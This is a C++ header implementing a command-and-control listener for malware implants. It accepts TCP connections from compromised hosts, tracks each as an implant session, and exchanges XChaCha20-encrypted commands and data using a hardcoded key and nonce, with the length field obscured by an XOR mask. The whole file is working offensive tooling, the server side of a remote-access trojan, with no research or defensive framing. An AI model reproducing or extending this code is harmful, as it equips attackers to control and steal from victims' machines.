#pragma once
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <vector>
#include <string>
#include <map>
#include <mutex>
#include <thread>
#include <algorithm>
#include "../Common/XChaCha20.h"

namespace C2Listener {
    // Stores information about a connected implant
    struct ImplantSession {
        SOCKET socket = INVALID_SOCKET;
        std::string hostname;
        std::string username;
        std::string os_info;
        uint32_t last_beacon = 0;
        XChaCha20 encryptor;
        bool active = false;
    };

    struct ListenerState {
        SOCKET listen_socket = INVALID_SOCKET;
        std::map<uint32_t, ImplantSession> sessions;
        uint32_t next_session_id = 1;
        std::mutex sessions_mutex;
        bool running = false;
        uint8_t session_key[32];
        uint8_t session_nonce[24];
    };

    // Global listener state
    inline ListenerState g_listener;

    bool init_listener(const char* bind_addr, uint16_t port);
    bool send_to_implant(uint32_t session_id, const std::vector<uint8_t>& data);
    std::pair<uint32_t, std::vector<uint8_t>> receive_from_implant(uint32_t session_id);
    void accept_loop();
}

inline bool C2Listener::init_listener(const char* bind_addr, uint16_t port) {
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) return false;

    g_listener.listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_listener.listen_socket == INVALID_SOCKET) return false;

    int reuse = 1;
    setsockopt(g_listener.listen_socket, SOL_SOCKET, SO_REUSEADDR,
        reinterpret_cast<char*>(&reuse), sizeof(reuse));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, bind_addr, &addr.sin_addr);

    if (bind(g_listener.listen_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
        closesocket(g_listener.listen_socket);
        return false;
    }
    if (listen(g_listener.listen_socket, 10) == SOCKET_ERROR) {
        closesocket(g_listener.listen_socket);
        return false;
    }

    g_listener.running = true;
    g_listener.next_session_id = 1;

    memcpy(g_listener.session_key,
        "\x8A\x1F\xC3\x7E\x92\x4B\x6D\x0F"
        "\x33\x58\xA7\xE1\x4C\x2D\x9F\x76"
        "\xB5\x08\xED\x13\x67\xCA\x82\x3A"
        "\xF0\x5E\x19\xD4\xAB\x71\x06\xCC", 32);
    memcpy(g_listener.session_nonce,
        "\x11\x22\x33\x44\x55\x66\x77\x88"
        "\x99\xAA\xBB\xCC\xDD\xEE\xFF\x00"
        "\x10\x20\x30\x40\x50\x60\x70\x80", 24);
    return true;
}

inline bool C2Listener::send_to_implant(uint32_t session_id, const std::vector<uint8_t>& data) {
    std::lock_guard<std::mutex> lock(g_listener.sessions_mutex);
    auto it = g_listener.sessions.find(session_id);
    if (it == g_listener.sessions.end() || !it->second.active) return false;

    std::vector<uint8_t> encrypted = data;
    it->second.encryptor.process(encrypted.data(), encrypted.size());

    uint32_t size = static_cast<uint32_t>(encrypted.size());
    uint32_t size_enc = size ^ 0xDEADBEEF;
    send(it->second.socket, reinterpret_cast<const char*>(&size_enc), sizeof(size_enc), 0);

    int total = 0;
    while (total < static_cast<int>(encrypted.size())) {
        int sent = send(it->second.socket,
            reinterpret_cast<const char*>(encrypted.data()) + total,
            static_cast<int>(encrypted.size()) - total, 0);
        if (sent <= 0) {
            it->second.active = false;
            return false;
        }
        total += sent;
    }
    return true;
}

inline std::pair<uint32_t, std::vector<uint8_t>> C2Listener::receive_from_implant(uint32_t session_id) {
    std::lock_guard<std::mutex> lock(g_listener.sessions_mutex);
    auto it = g_listener.sessions.find(session_id);
    if (it == g_listener.sessions.end() || !it->second.active) {
        return { session_id, {} };
    }

    u_long mode = 1;
    ioctlsocket(it->second.socket, FIONBIO, &mode);
    uint32_t size_enc = 0;
    int received = recv(it->second.socket, reinterpret_cast<char*>(&size_enc), sizeof(size_enc), 0);
    mode = 0;
    ioctlsocket(it->second.socket, FIONBIO, &mode);

    if (received != sizeof(size_enc)) return { session_id, {} };

    uint32_t size = size_enc ^ 0xDEADBEEF;
    if (size > 10 * 1024 * 1024) return { session_id, {} };

    std::vector<uint8_t> encrypted(size);
    int total = 0;
    while (total < static_cast<int>(size)) {
        received = recv(it->second.socket,
            reinterpret_cast<char*>(encrypted.data()) + total,
            static_cast<int>(size) - total, 0);
        if (received <= 0) break;
        total += received;
    }

    if (total < static_cast<int>(size)) return { session_id, {} };

    it->second.encryptor.process(encrypted.data(), encrypted.size());
    it->second.last_beacon = GetTickCount();
    return { session_id, encrypted };
}

inline void C2Listener::accept_loop() {
    while (g_listener.running) {
        sockaddr_in client_addr{};
        int addr_len = sizeof(client_addr);
        SOCKET client = accept(g_listener.listen_socket,
            reinterpret_cast<sockaddr*>(&client_addr),
            &addr_len);
        if (client == INVALID_SOCKET) continue;

        ImplantSession session;
        session.socket = client;
        session.active = true;
        session.last_beacon = GetTickCount();
        session.encryptor.init(g_listener.session_key, g_listener.session_nonce);

        char client_ip[64];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));

        uint32_t session_id;
        {
            std::lock_guard<std::mutex> lock(g_listener.sessions_mutex);
            session_id = g_listener.next_session_id++;
            session.hostname = client_ip;
            session.username = "unknown";
            session.os_info = "unknown";
            g_listener.sessions[session_id] = session;
        }
        printf("[+] New implant: %s (Session #%u)\n", client_ip, session_id);
    }
}